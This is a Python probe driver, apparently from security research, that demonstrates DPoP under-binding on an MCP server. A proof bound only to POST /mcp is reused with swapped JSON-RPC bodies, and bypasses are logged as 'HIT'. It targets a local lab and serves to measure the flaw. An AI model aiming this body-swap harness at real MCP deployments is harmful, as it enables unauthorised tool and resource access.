"""A_leak body-dispatch driver for an MCP streamable-HTTP server behind the edge verifier.

Thesis instance (G1 under-binding): every MCP operation is one `POST /mcp`. A DPoP proof /
sender-constrained token binds only (htm=POST, htu=.../mcp); the JSON-RPC **body**
(`method`, and for tools `params.name`) selects the actual operation. So ONE leaked proof the
client minted for a benign call (e.g. `tools/list`) authorises ANY MCP operation when the body
is swapped — the verifier sees `POST /mcp` and allows every time. The body is never covered by
the proof (nginx sends `proxy_pass_request_body off` to the verifier; DPoP has no body binding).

Each probe: fresh proof bound to POST /mcp (= the client's proof for the base op), body swapped
to the target operation, reusing one negotiated Mcp-Session-Id. Oracle = the MCP server's own
JSON-RPC response (which operation executed, success vs error) + the server log.
"""
from __future__ import annotations

import json
import os
import re
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__)))
import probe_lib as P  # noqa: E402

MCP_PATH = "/mcp"
PROTO = "2025-06-18"


def mcp_headers(authz, proof, session=None, extra=None):
    h = [("Host", P.HOST), ("Authorization", authz), ("DPoP", proof),
         ("Content-Type", "application/json"),
         ("Accept", "application/json, text/event-stream"),
         ("MCP-Protocol-Version", PROTO)]
    if session:
        h.append(("Mcp-Session-Id", session))
    for n, v in (extra or []):
        h.append((n, v))
    return h


def parse_sse_or_json(body: bytes):
    """Return the JSON-RPC object from an SSE 'data:' line or a plain JSON body."""
    txt = body.decode("utf-8", "replace")
    for line in txt.splitlines():
        line = line.strip()
        if line.startswith("data:"):
            try:
                return json.loads(line[5:].strip())
            except Exception:  # noqa: BLE001
                pass
    try:
        return json.loads(txt)
    except Exception:  # noqa: BLE001
        return None


def send_mcp(port, method_body, session=None, mint_htu=MCP_PATH):
    """Mint a fresh proof bound to POST+mint_htu, POST the given JSON-RPC body."""
    authz, proof, jti = P.mint("alice", "POST", mint_htu)
    body = json.dumps(method_body).encode()
    raw = P.build_raw("POST", MCP_PATH, mcp_headers(authz, proof, session), body)
    r = P.send("127.0.0.1", port, raw, timeout=20)
    sid = next((v for n, v in r.headers if n.lower() == "mcp-session-id"), None)
    return r, jti, sid


def initialize(port):
    body = {"jsonrpc": "2.0", "id": 1, "method": "initialize",
            "params": {"protocolVersion": PROTO, "capabilities": {},
                       "clientInfo": {"name": "w22", "version": "1"}}}
    r, jti, sid = send_mcp(port, body)
    obj = parse_sse_or_json(r.body)
    return r, sid, obj


def notify_initialized(port, session):
    authz, proof, _ = P.mint("alice", "POST", MCP_PATH)
    body = json.dumps({"jsonrpc": "2.0", "method": "notifications/initialized"}).encode()
    raw = P.build_raw("POST", MCP_PATH, mcp_headers(authz, proof, session), body)
    return P.send("127.0.0.1", port, raw, timeout=10)


def rpc(port, session, method, params=None, rid=100):
    body = {"jsonrpc": "2.0", "id": rid, "method": method}
    if params is not None:
        body["params"] = params
    r, jti, _ = send_mcp(port, body, session=session)
    time.sleep(0.25)
    return r, jti, parse_sse_or_json(r.body)


if __name__ == "__main__":
    # explore: initialize, list tools/resources/prompts
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 18110
    r, sid, obj = initialize(port)
    print("initialize:", r.status, "session=", sid)
    print("  server:", json.dumps(obj.get("result", {}).get("serverInfo", {})) if obj else obj)
    print("  caps:", json.dumps(obj.get("result", {}).get("capabilities", {})) if obj else None)
    notify_initialized(port, sid)
    for m in ("tools/list", "resources/list", "prompts/list"):
        rr, jti, o = rpc(port, sid, m)
        items = (o or {}).get("result", {})
        names = [x.get("name") for x in items.get("tools", items.get("resources", items.get("prompts", [])))] if o else None
        print(f"{m}: {rr.status} -> {names}")


def _verifier_rec(path, jti):
    return P.read_verifier_record(path, jti)


def run_battery(port, battery, verifier_log, app_container, out_path):
    """battery: list of {label, body, intended('base'|'attack'), sev}. Reuses one session."""
    import datetime
    r, sid, obj = initialize(port)
    notify_initialized(port, sid)
    recs = []
    with open(out_path, "w") as fh:
        for b in battery:
            t0 = P._now_rfc3339()
            rr, jti, _sid2 = send_mcp(port, b["body"], session=sid)
            time.sleep(0.3)
            t1 = P._now_rfc3339()
            o = parse_sse_or_json(rr.body)
            v = _verifier_rec(verifier_log, jti)
            applog = P.docker_logs_since(app_container, t0, t1) if app_container else ""
            if not isinstance(o, dict):
                o = {}
            is_err = "error" in o
            result = o.get("result")
            # summarise what executed
            m = b["body"].get("method")
            name = (b["body"].get("params") or {}).get("name") or (b["body"].get("params") or {}).get("uri")
            execd = f"{m}:{name}" if name else m
            rec = {"label": b["label"], "intended": b.get("intended"),
                   "executed_op": execd, "jti": jti,
                   "http_status": rr.status, "jsonrpc_error": is_err,
                   "verifier_decision": v.get("decision"), "verifier_view_uri": v.get("view_uri"),
                   "result_summary": json.dumps(result)[:280] if result is not None else None,
                   "error_summary": json.dumps(o.get("error"))[:200] if is_err else None,
                   "sev": b.get("sev"),
                   "app_log": applog.strip()[-400:]}
            fh.write(json.dumps(rec) + "\n")
            recs.append(rec)
            ok = "HIT" if (rec["verifier_decision"] == "allow" and rr.status < 400 and not is_err and b.get("intended") == "attack") else ""
            print(f'{rec["label"]:30} V={str(rec["verifier_decision"]):5} http={rr.status} jsonrpc_err={is_err} op={execd:34} {ok}')
    return recs
